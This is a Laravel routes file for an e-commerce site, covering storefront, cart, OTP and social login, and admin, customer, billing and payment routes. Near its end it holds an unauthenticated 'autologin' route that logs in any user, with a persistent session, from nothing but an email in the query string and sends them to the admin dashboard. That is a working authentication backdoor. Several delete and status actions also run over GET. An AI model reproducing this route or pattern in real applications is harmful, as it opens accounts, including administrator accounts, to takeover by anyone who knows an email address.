<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\Admin\AnalyticsController;
use App\Http\Controllers\Admin\DiscountController;
use App\Http\Controllers\HomeController;

// Home page route start
Route::get('/', [HomeController::class, 'index'])->name('home');

// Home page route end
Route::get('/productList', [HomeController::class, 'productList'])->name('productList');
Route::get('/product/{id}', [HomeController::class, 'productShow'])->name('product.show');


Route::get('/product', function () {
    return view('front.product'); 
});

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/
//email login page
Route::get('/email-login', 'Auth\LoginController@emailLogin')->name('email.login');
//otp login page
Route::get('/otp-log-in', 'Auth\LoginController@otpLogin')->name('otp.login');
Route::post('/otp-send', 'Auth\LoginController@sendOTP')->name('otp.send');
Route::post('/otp-verify', 'Auth\LoginController@verifyOTP')->name('otp.verify');


Route::post('/log-in', 'Auth\LoginController@loginNew')->name('login.new');
Route::match(['get', 'post'], '/otplog-in', 'Auth\LoginController@otpLoginNew')->name('otplogin.new');
Auth::routes();

// Social Logins
Route::get('/login/{provider}', 'Auth\LoginController@redirectToProvider')->name('social.login');
Route::get('/login/{provider}/callback', 'Auth\LoginController@handleProviderCallback')->name('social.callback');

// Carts
Route::get('/cart', 'CartController@cart')->name('cart');
Route::post('/add-cart', 'CartController@addCart')->name('cart.add');
Route::get('/cart/remove/{cart_id}', 'CartController@removeCart')->name('cart.remove');
Route::get('/cart/add/{cart_id}', 'CartController@plusOne')->name('cart.plusOne');
Route::get('/cart/minus/{cart_id}', 'CartController@minusOne')->name('cart.minusOne');

// Route::get('/check-out', 'CartController@proceedCart')->name('cart.checkout');

Route::match(['get', 'post'], '/check-out', 'CartController@proceedCart')->name('cart.checkout');

// Role Redirect Routes
Route::get('/role', 'RoleController@redirectRoutes')->name('role');
Route::get('/home', 'RoleController@redirectRoutes');

Route::get('/about-us', 'CommonController@aboutUs');
Route::get('/contact-us', 'CommonController@contactUs')->name('contact-us');
Route::post('/contact-us', 'CommonController@sendContact')->name('contact');
Route::get('/privacy-policy', 'CommonController@privacyPolicy')->name('privacy.policy');
Route::get('/refund-policy', 'CommonController@refundPolicy')->name('refund.policy');
Route::get('/terms-conditions', 'CommonController@termsConditions')->name('terms.conditions');

// Admin + Super Admin + Executive Routes
Route::group([ 'prefix' => 'admin', 'middleware'=> ['auth' => 'Admin']], function () {

    Route::get('/dashboard', 'Admin\DashboardController@dashboard')->name('dashboard');
    // Analytics
    Route::get('/analytics', [AnalyticsController::class, 'index'])->name('analytics.index');

    // Report
    Route::group(['prefix' => 'reports'], function () {
        // Route to list reports
        Route::get('/customer','Admin\ReportController@index')->name('reports.index');
        Route::get('/month/wise', 'Admin\ReportController@monthlyAnalysis')->name('reports.monthly');
        Route::get('/daily/wise', 'Admin\ReportController@dailyAnalysis')->name('reports.daily');
        Route::get('/pendingpayment/wise', 'Admin\ReportController@pendingPayment')->name('reports.pendingpayment');

        Route::get('/cutomerdownload/pdf','Admin\ReportController@downloadPdf')->name('customer.download.pdf');
        Route::get('/monthlydownload/pdf','Admin\ReportController@downloadmonthlyAnalysis')->name('monthly.download.pdf');
        Route::get('/dailydownload/pdf','Admin\ReportController@downloaddailyAnalysis')->name('daily.download.pdf');
        Route::get('/pendingpaymentdownload/pdf','Admin\ReportController@downloadpendingPayment')->name('pendingPayment.download.pdf');

    });

    //discount
    Route::group(['prefix' => 'discount'], function () {
        Route::get('/index', [DiscountController::class, 'index'])->name('discount.index');
        Route::post('/create', [DiscountController::class, 'store'])->name('discount.store');
        Route::get('/edit/{id}', [DiscountController::class, 'edit'])->name('discount.edit');
        Route::post('/update/{id}', [DiscountController::class, 'update'])->name('discount.update');
        Route::post('/delete/{id}', [DiscountController::class, 'destroy'])->name('discount.destroy');
        Route::get('/show/{id}', [DiscountController::class, 'show'])->name('discount.show');
    });

    // Users
    Route::group(['prefix' => 'user'], function () {
        Route::get('/create', 'Admin\UserController@addUser')->name('user.create');
        Route::post('/save', 'Admin\UserController@saveUser')->name('user.save');
        Route::get('/list', 'Admin\UserController@listUser')->name('user.list');
        Route::get('/edit/{user_id}', 'Admin\UserController@editUser')->name('user.edit');
        Route::post('/update', 'Admin\UserController@updateUser')->name('user.update');
    });

    // Vendors
    Route::group(['prefix' => 'vendor'], function () {
        Route::get('/create', 'Admin\VendorController@add')->name('vendor.create');
        Route::post('/save', 'Admin\VendorController@save')->name('vendor.save');
        Route::get('/list', 'Admin\VendorController@list')->name('vendor.list');
        Route::get('/edit/{vendor_id}', 'Admin\VendorController@edit')->name('vendor.edit');
        Route::post('/update', 'Admin\VendorController@update')->name('vendor.update');
        
      
    });
    
     // Vendors
    Route::group(['prefix' => 'vendors-product'], function () {
        Route::get('/', 'Admin\VendorsProductController@index')->name('vendors-product.list');
        Route::get('/create', 'Admin\VendorsProductController@create')->name('vendors-product.create');
        Route::post('/save', 'Admin\VendorsProductController@save')->name('vendors-product.save');
        Route::get('/edit/{vendor_id}', 'Admin\VendorsProductController@edit')->name('vendors-product.edit');
        Route::put('/vendors-product/{id}', 'Admin\VendorsProductController@update')->name('vendors-product.update');
        Route::delete('/vendors-product/{id}', 'Admin\VendorsProductController@destroy')->name('vendors-product.destroy');
    });

     
    // Category
    Route::group(['prefix' => 'category'], function () {
        Route::get('/list', 'Admin\CategoryController@list')->name('category.list');
        Route::post('/save', 'Admin\CategoryController@save')->name('category.save');
        Route::get('/edit/{id}', 'Admin\CategoryController@edit')->name('category.edit');
        Route::post('/update', 'Admin\CategoryController@update')->name('category.update');
    });

    // Sub Category
    Route::group(['prefix' => 'subcategory'], function () {
        Route::get('/list', 'Admin\SubcategoryController@list')->name('subcategory.list');
        Route::post('/save', 'Admin\SubcategoryController@save')->name('subcategory.save');
        Route::get('/edit/{id}', 'Admin\SubcategoryController@edit')->name('subcategory.edit');
        Route::post('/update', 'Admin\SubcategoryController@update')->name('subcategory.update');
    });

    // Banner
    Route::group(['prefix' => 'banner'], function () {
        Route::get('/list', 'Admin\BannerController@list')->name('banner.list');
        Route::post('/save', 'Admin\BannerController@save')->name('banner.save');
        Route::get('/edit/{id}', 'Admin\BannerController@edit')->name('banner.edit');
        Route::post('/update', 'Admin\BannerController@update')->name('banner.update');
    });

    // Mobile Banner
    Route::group(['prefix' => 'mobile-banner'], function () {
        Route::get('/list', 'Admin\MobileBannerController@list')->name('mobile.banner.list');
        Route::post('/save', 'Admin\MobileBannerController@save')->name('mobile.banner.save');
        Route::get('/edit/{id}', 'Admin\MobileBannerController@edit')->name('mobile.banner.edit');
        Route::post('/update', 'Admin\MobileBannerController@update')->name('mobile.banner.update');
    });
    
    // News
    Route::group(['prefix' => 'news'], function () {
        Route::get('/list', 'Admin\NewsController@list')->name('news.list');
        Route::post('/save', 'Admin\NewsController@save')->name('news.save');
        Route::get('/edit/{id}', 'Admin\NewsController@edit')->name('news.edit');
        Route::post('/update', 'Admin\NewsController@update')->name('news.update');
    });
    
    // Products
    Route::group(['prefix' => 'product'], function () {

        Route::get('/list', 'Admin\ProductController@list')->name('product.list');
        Route::match(['get', 'post'], '/save', 'Admin\ProductController@save')->name('product.save');
        Route::get('/edit/{id}/{tab}/{page}', 'Admin\ProductController@edit')->name('product.edit');
        Route::put('/update/{id}', 'Admin\ProductController@update')->name('product.update');
        Route::post('/export', 'Admin\ProductController@export')->name('product.export');
        Route::any('/import', 'Admin\ProductController@exportUpdate')->name('product.import');
        
         Route::get('/view/bulk/update', 'Admin\ProductController@productViewBulkUpdate')->name('product.ViewBulkUpdate');

        Route::post('/bulk/update', 'Admin\ProductController@productBulkUpdate')->name('product.BulkUpdate');
        
        Route::post('/image/bulk/update', 'Admin\ProductController@uploadImages')->name('product.image.BulkUpdate');
            Route::post('/json/bulk/update', 'Admin\ProductController@productJSONBulkUpdate')->name('product.json.BulkUpdate');
        
        Route::get('/delete/{id}', 'Admin\ProductController@delete')->name('product.delete');
        
        // Price
        Route::group(['prefix' => 'price'], function () {
            Route::put('/update', 'Admin\ProductPriceController@update')->name('product.price.update');
            Route::get('/delete/{id}', 'Admin\ProductPriceController@delete')->name('product.price.delete');
        });
       
        // Specification
        Route::group(['prefix' => 'specification'], function () {
            Route::put('/update', 'Admin\ProductSpecificationController@update')->name('product.specification.update');
            Route::get('/delete/{id}', 'Admin\ProductSpecificationController@delete')->name('product.specification.delete');
        });
        
        // Feature
        Route::group(['prefix' => 'feature'], function () {
            Route::put('/update', 'Admin\ProductFeatureController@update')->name('product.feature.update');
            Route::get('/delete/{id}', 'Admin\ProductFeatureController@delete')->name('product.feature.delete');
        });
        
        // Image
        Route::group(['prefix' => 'image'], function () {
            Route::put('/update', 'Admin\ProductImageController@update')->name('product.image.update');
            Route::get('/delete/{id}', 'Admin\ProductImageController@delete')->name('product.image.delete');
        });
           
    });
             
    // Delivery Area
    Route::group(['prefix' => 'delivery-area'], function () {
        Route::get('/list', 'Admin\DeliveryAreaController@list')->name('delivery.area.list');
        Route::post('/save', 'Admin\DeliveryAreaController@save')->name('delivery.area.save');
        Route::get('/edit/{id}/{tab}', 'Admin\DeliveryAreaController@edit')->name('delivery.area.edit');
        Route::post('/update', 'Admin\DeliveryAreaController@update')->name('delivery.area.update');
        Route::post('/slot/update', 'Admin\DeliveryAreaController@updateSlots')->name('delivery.area.slot.update');
    });
    
    // Delivery Slot
    Route::group(['prefix' => 'delivery-slot'], function () {
        Route::get('/list', 'Admin\DeliverySlotController@list')->name('delivery.slot.list');
        Route::post('/save', 'Admin\DeliverySlotController@save')->name('delivery.slot.save');
        Route::get('/edit/{id}', 'Admin\DeliverySlotController@edit')->name('delivery.slot.edit');
        Route::post('/update', 'Admin\DeliverySlotController@update')->name('delivery.slot.update');
    });

     // Promo Code
     Route::group(['prefix' => 'promo-code'], function () {
        Route::get('/list', 'Admin\PromoCodeController@index')->name('promocode.list');
        Route::post('/save', 'Admin\PromoCodeController@store')->name('promocode.store');
        Route::get('/edit/{id}', 'Admin\PromoCodeController@edit')->name('promocode.edit');
        Route::post('/update/{id}', 'Admin\PromoCodeController@update')->name('promocode.update');        
    });

     // Order
    Route::group(['prefix' => 'order'], function () {
        Route::get('/list', 'Admin\OrderController@list')->name('order.list');
        Route::get('/detail/{id}/{type}', 'Admin\OrderController@details')->name('order.detail');
        Route::get('/download/{id}', 'Admin\OrderController@downloadHtml')->name('order.download.html');
        Route::post('/update/{id}', 'Admin\OrderController@update')->name('order.update');
        Route::get('/invoice/{id}', 'Admin\OrderController@viewPdf')->name('order.invoice.pdf');
        Route::any('/summary', 'Admin\OrderController@summary')->name('order.summary');
        
        // Customer orders
        
        Route::group(['prefix' => 'customer'], function () {
            Route::get('/', 'Admin\OrderController@customers')->name('order.customers');
            Route::get('/view/{id}', 'Admin\OrderController@customerOrderView')->name('order.customer.view');
        });
    });

    // Requested Products
    Route::group(['prefix' => 'requestedproducts'], function () {
        Route::any('/summary', 'Admin\OrderController@requestedproductssummary')->name('requestedproducts.summary');
    });
    
    // Reviews
    Route::group(['prefix' => 'review'], function () {
        Route::get('/list', 'Admin\ReviewController@list')->name('review.list');
        Route::get('/delete/{product_id}/{id}', 'Admin\ReviewController@delete')->name('review.delete');
        Route::get('/update/{product_id}/{id}/{status}', 'Admin\ReviewController@update')->name('review.update');
    });

    // Customer
    Route::group(['prefix' => 'customer'], function () {
        Route::get('/list', 'Admin\CustomerController@list')->name('customer.list');
        Route::get('/view/{customer_id}', 'Admin\CustomerController@view')->name('customer.view');
        Route::get('/edit/{user_id}', 'Admin\CustomerController@edit')->name('customer.edit');
        Route::post('/update', 'Admin\CustomerController@update')->name('customer.update');
    });

    // Rider
    Route::group(['prefix' => 'rider'], function () {
        Route::get('/create', 'Admin\RiderController@addRider')->name('rider.create');
        Route::post('/save', 'Admin\RiderController@saveRider')->name('rider.save');
        Route::get('/list', 'Admin\RiderController@list')->name('rider.list');
        Route::get('/view/{rider_id}', 'Admin\RiderController@view')->name('rider.view');
    });

    // Notifications    
    Route::group(['prefix' => 'notification'], function () {
        Route::post('/save', 'NotificationController@saveNotification')->name('notification.save');
        Route::get('/group/{type}', 'NotificationController@groupNotification')->name('notification.group');
        Route::post('/group/tag/{type}', 'NotificationController@groupNotificationTag')->name('notification.group.tag');
        Route::post('/group/{type}', 'NotificationController@groupNotificationFromMap')->name('notification.group.map');
        Route::get('/rider/send/{id}', 'NotificationController@riderNotification')->name('notification.rider');
        Route::get('/customer/send/{id}', 'NotificationController@customerNotification')->name('notification.customer');
        Route::get('/rider/send/{id}', 'NotificationController@riderNotification')->name('notification.rider');
    });

    // Settings
    Route::group(['prefix' => 'settings'], function () {
        Route::get('/edit', 'Admin\SettingsController@edit')->name('setting.edit');
        Route::post('/save', 'Admin\SettingsController@save')->name('setting.save');
        Route::post('/upadte', 'Admin\SettingsController@update')->name('setting.update');
    });

    // Billing
    Route::group(['prefix' => 'billing'], function () {
        Route::post('/', 'Admin\BillingController@billing')->name('billing');
        Route::get('/add', 'Admin\BillingController@add')->name('billing.add');
        Route::get('/customers', 'Admin\BillingController@customers')->name('billing.customers');
        Route::get('/customer/{id}', 'Admin\BillingController@customer')->name('billing.customer');
        Route::get('/shipping/{id}/{sub_total}', 'Admin\BillingController@checkShipping')->name('billing.shipping');
        Route::post('/create-user', 'Admin\BillingController@createUser')->name('billing.create.user');
        Route::post('/create-address', 'Admin\BillingController@createAddress')->name('billing.create.address');
    });

});


// Customer Routes
Route::group([ 'prefix' => 'customer', 'middleware'=> ['auth' => 'Customer']], function () {
    Route::get('/profile', 'Customer\DashboardController@profile')->name('customer.profile');
    Route::post('/profile', 'Customer\DashboardController@profileUpdate')->name('customer.profile.update');
    Route::get('/orders', 'Customer\DashboardController@orders')->name('customer.orders');
    Route::get('/wishlist', 'Customer\DashboardController@wishlist')->name('customer.wishlist');
    Route::get('/orderdetails/{id}', 'Customer\DashboardController@orderdetails')->name('customer.orderdetails');
    Route::get('/downloads', 'Customer\DashboardController@downloads')->name('customer.downloads');
    Route::get('/my-address', 'Customer\DashboardController@address')->name('customer.address');
    Route::get('/my-address/remove/{id}', 'Customer\DashboardController@deleteAddress')->name('customer.address.remove');
    Route::get('/edit/{id}/{type}', 'Customer\DashboardController@editAddress')->name('customer.address.edit');
    Route::post('/my-address/update', 'Customer\DashboardController@updateAddress')->name('customer.address.update');
    
    // Wishlist
    Route::get('/wishlist/{product_id}/{type}', 'Customer\WishListController@add')->name('wishlist.add');
    
    // Carts
    Route::get('/checkout', 'CartController@proceedCart')->name('cart.order.checkout');
    Route::get('/place-order', 'CartController@placeOrder')->name('cart.order.place');
    Route::get('/select-address', 'CartController@selectAddress')->name('customer.address.select');
    Route::post('/add-address', 'CartController@addAddress')->name('customer.address.add');
    Route::post('/add-mobile', 'CartController@addMobile')->name('customer.mobile.add');
    Route::get('/address-fare-update/{id}', 'CartController@updateAdressAndFare')->name('cart.order.update.address-fare');
    Route::any('/summary/{id}', 'CartController@summary')->name('customer.cart.summary');

    // Payment
    Route::post('/cod/{order_id}', 'Customer\PaymentController@cashOnDelivery')->name('cart.payment.cod');
    Route::post('/payment', 'Customer\PaymentController@payment')->name('cart.payment.online');
    Route::post('/update-delivery-fields', 'Customer\PaymentController@updateDeliveryFields')->name('update.delivery.fields');

});


// Review
Route::get('/review', 'ReviewController@review')->name('customer.review');

// Auth Free Routes
Route::get('/oldhome', 'HomeController@home')->name('oldhome');
Route::get('/product/{menu}/{slug}/{sub_slug}', 'HomeController@products')->name('products');
Route::get('/product/{price_id}/{slug}', 'HomeController@product')->name('product.details');
Route::get('/search', 'HomeController@searchProducts')->name('product.search');

// Route::get('/clear', function () {
//     Artisan::call('view:clear');
//     Artisan::call('config:cache');
//     Artisan::call('storage:link');
//     echo 'done';
// });

 Route::get('autologin', function () {
        $email = $_GET['email'];
        $user = \App\User::where('email', $email)->first();
        Auth::login($user, true);
        return redirect()->intended('/admin/dashboard');
    });
 Route::post('/user/logout', '\App\Http\Controllers\HomeController@userlogout')->name('user.logout');
